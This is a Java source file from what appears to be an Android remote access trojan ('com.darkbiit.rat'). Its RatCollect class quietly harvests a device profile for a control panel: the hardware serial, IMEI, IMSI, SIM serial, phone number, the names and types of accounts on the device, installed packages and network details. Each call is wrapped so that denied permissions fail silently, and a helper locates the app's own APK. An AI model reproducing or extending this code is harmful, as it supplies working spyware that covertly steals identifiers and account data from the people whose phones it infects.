package com.darkbiit.rat;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.telephony.TelephonyManager;

import java.io.File;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Device/app inventory collector.
 *
 * Every accessor is wrapped: a permission that was not granted, or an OEM
 * TelephonyManager that throws, must degrade to "unavailable" instead of
 * killing the collector. The panel shows whatever survived.
 */
public final class RatCollect {

    private RatCollect() {
    }

    /** Full device/app inventory as a flat map of string -> string. */
    public static Map<String, Object> inventory(Context ctx) {
        Map<String, Object> m = new LinkedHashMap<String, Object>();

        m.put("device_model", Build.MODEL);
        m.put("device_brand", Build.BRAND);
        m.put("device_manufacturer", Build.MANUFACTURER);
        m.put("device_product", Build.PRODUCT);
        m.put("android_release", Build.VERSION.RELEASE);
        m.put("android_sdk", Build.VERSION.SDK_INT);
        m.put("android_build", Build.ID);
        m.put("fingerprint", Build.FINGERPRINT);
        m.put("hardware", Build.HARDWARE);
        m.put("board", Build.BOARD);
        m.put("serial", safeSerial(ctx));
        m.put("supported_abis", join(Build.SUPPORTED_ABIS));
        m.put("package", ctx.getPackageName());
        m.put("version_code", versionCode(ctx));
        m.put("version_name", versionName(ctx));

        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        m.put("telephony", telephonyInfo(tm));

        m.put("accounts", accounts(ctx));
        m.put("installed_apps", installedApps(ctx, 400));
        m.put("network", networkInfo(ctx));

        return m;
    }

    private static String safeSerial(Context ctx) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                return Build.getSerial();
            }
        } catch (SecurityException e) {
            return "denied";
        } catch (Throwable t) {
            return "error";
        }
        return Build.SERIAL;
    }

    private static Map<String, Object> telephonyInfo(TelephonyManager tm) {
        Map<String, Object> m = new LinkedHashMap<String, Object>();
        if (tm == null) {
            m.put("available", false);
            return m;
        }
        m.put("available", true);
        m.put("sim_state", simState(tm));
        m.put("network_operator", str(tm, "getNetworkOperatorName"));
        m.put("network_country", str(tm, "getNetworkCountryIso"));
        m.put("operator", str(tm, "getSimOperatorName"));
        m.put("phone_type", phoneType(tm));
        m.put("sim_serial", str(tm, "getSimSerialNumber"));
        m.put("subscriber_id", str(tm, "getSubscriberId"));
        m.put("device_id", str(tm, "getDeviceId"));
        m.put("line1", str(tm, "getLine1Number"));
        m.put("sim_count", simCount(tm));
        return m;
    }

    private static String simState(TelephonyManager tm) {
        try {
            switch (tm.getSimState()) {
                case TelephonyManager.SIM_STATE_READY:
                    return "ready";
                case TelephonyManager.SIM_STATE_ABSENT:
                    return "absent";
                case TelephonyManager.SIM_STATE_NETWORK_LOCKED:
                    return "network_locked";
                case TelephonyManager.SIM_STATE_PIN_REQUIRED:
                    return "pin_required";
                case TelephonyManager.SIM_STATE_PUK_REQUIRED:
                    return "puk_required";
                default:
                    return "unknown";
            }
        } catch (Throwable t) {
            return "error";
        }
    }

    private static String phoneType(TelephonyManager tm) {
        try {
            switch (tm.getPhoneType()) {
                case TelephonyManager.PHONE_TYPE_NONE:
                    return "none";
                case TelephonyManager.PHONE_TYPE_GSM:
                    return "gsm";
                case TelephonyManager.PHONE_TYPE_CDMA:
                    return "cdma";
                case TelephonyManager.PHONE_TYPE_SIP:
                    return "sip";
                default:
                    return "unknown";
            }
        } catch (Throwable t) {
            return "error";
        }
    }

    private static int simCount(TelephonyManager tm) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return tm.getPhoneCount();
            }
        } catch (Throwable ignored) {
            // fall through
        }
        return 1;
    }

    /**
     * Calls a TelephonyManager getter by reflection.
     * These getters throw SecurityException on modern Android when the
     * permission is missing, so every call must be guarded.
     */
    private static String str(TelephonyManager tm, String method) {
        try {
            Object v = TelephonyManager.class.getMethod(method).invoke(tm);
            return v == null ? "" : v.toString();
        } catch (Throwable t) {
            return "denied";
        }
    }

    private static Map<String, Object> accounts(Context ctx) {
        List<Object> out = new ArrayList<Object>();
        try {
            AccountManager am = AccountManager.get(ctx);
            Account[] accs = am.getAccounts();
            for (Account a : accs) {
                Map<String, Object> one = new LinkedHashMap<String, Object>();
                one.put("name", a.name);
                one.put("type", a.type);
                out.add(one);
            }
        } catch (Throwable t) {
            // no GET_ACCOUNTS permission or no accounts
        }
        return mapOf("count", out.size(), "accounts", out);
    }

    private static Map<String, Object> networkInfo(Context ctx) {
        Map<String, Object> m = new LinkedHashMap<String, Object>();
        try {
            ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) {
                return m;
            }
            NetworkInfo info = cm.getActiveNetworkInfo();
            if (info != null) {
                m.put("type", info.getTypeName());
                m.put("subtype", info.getSubtypeName());
                m.put("connected", info.isConnected());
                m.put("extra", info.getExtraInfo());
            }
        } catch (Throwable t) {
            m.put("error", t.getClass().getSimpleName());
        }
        return m;
    }

    /** Package name -> versionName for up to {@code limit} installed packages. */
    private static List<Object> installedApps(Context ctx, int limit) {
        List<Object> out = new ArrayList<Object>();
        try {
            PackageManager pm = ctx.getPackageManager();
            List<android.content.pm.ApplicationInfo> infos =
                    pm.getInstalledApplications(0);
            int n = 0;
            for (android.content.pm.ApplicationInfo ai : infos) {
                if (n++ >= limit) {
                    break;
                }
                Map<String, Object> one = new LinkedHashMap<String, Object>();
                one.put("pkg", ai.packageName);
                one.put("flags", ai.flags);
                out.add(one);
            }
        } catch (Throwable t) {
            // package visibility restrictions on Android 11+
        }
        return out;
    }

    private static String versionCode(Context ctx) {
        try {
            return String.valueOf(ctx.getPackageManager()
                    .getPackageInfo(ctx.getPackageName(), 0).versionCode);
        } catch (Throwable t) {
            return "";
        }
    }

    private static String versionName(Context ctx) {
        try {
            return ctx.getPackageManager().getPackageInfo(ctx.getPackageName(), 0).versionName;
        } catch (Throwable t) {
            return "";
        }
    }

    /** Finds the APK of the host app in its own private storage (works after install). */
    public static File selfApk(Context ctx) {
        try {
            String src = ctx.getApplicationInfo().sourceDir;
            if (src != null) {
                return new File(src);
            }
        } catch (Throwable t) {
            // fall through
        }
        return null;
    }

    private static Map<String, Object> mapOf(Object... kv) {
        Map<String, Object> m = new LinkedHashMap<String, Object>();
        for (int i = 0; i + 1 < kv.length; i += 2) {
            m.put((String) kv[i], kv[i + 1]);
        }
        return m;
    }

    private static String join(String[] arr) {
        if (arr == null) {
            return "";
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < arr.length; i++) {
            if (i > 0) {
                sb.append(',');
            }
            sb.append(arr[i]);
        }
        return sb.toString();
    }
}
